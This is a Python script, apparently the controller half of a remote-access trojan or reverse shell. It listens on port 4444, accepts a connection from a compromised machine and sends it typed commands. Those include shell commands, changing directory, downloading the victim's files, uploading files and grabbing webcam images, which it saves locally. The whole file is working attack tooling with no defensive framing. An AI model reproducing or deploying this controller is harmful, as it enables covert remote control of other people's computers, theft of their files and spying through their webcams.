#!/usr/bin/env python3

import socket

# AF_INET allows us to create a connection between ipv4.
# SOCK_STREAM allow us to establish TCP connection.
# listener.accept() returns two values, connection and address.
# connection.send() will always send bytes.

num = 0

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.bind(("localhost", 4444))
listener.listen()
print("Server has started!")
connection, address = listener.accept()
print(f"Got connection from {address}")

def recv_data():
    size = connection.recv(2048).decode('utf-8')
    size = int(size)
    data = connection.recv(2048)
    while len(data) != size:
        data += connection.recv(2048)
    return data

def send_data(response):
#use only encoded data in response argument
    data_size = len(response)
    data_size = str(data_size)
    connection.send(data_size.encode())
    connection.send(response)

while True:
    try:
        command = input("Enter a command: ")
        connection.send(command.encode())
        if command == 'quit':
            connection.send(b'quit')
            connection.close()
            break
        elif command[:2] == 'cd':
            response = recv_data()
            print(response.decode('utf-8'))
            continue
        elif command[:8] == 'download':
            response = recv_data()
            if response == b'No file or directory exist!':
                print(response.decode('utf-8'))
            else:
                with open(f"{command[9:]}", "wb") as file:
                    file_write = file.write(response)
                    file.close()
            continue
        elif command[:6] == 'upload':
            with open(f"{command[7:]}", "rb") as upload_file:
                upload_file_read = upload_file.read()
                upload_file.close()
            send_data(upload_file_read)
            continue
        elif command[:6] == 'webcam':
            response = recv_data()
            if response == b'Webcam not found!':
                print(response.decode('utf-8'))
            else:
                with open(f"{num}.jpg", "wb") as write_image:
                    write_image.write(response)
                    num += 1
                    write_image.close()
                continue
        else:
            response = recv_data()
            print(response.decode('latin-1'))
    except FileNotFoundError:
        print("No file or directory exist!")
        send_data(b'Error!')



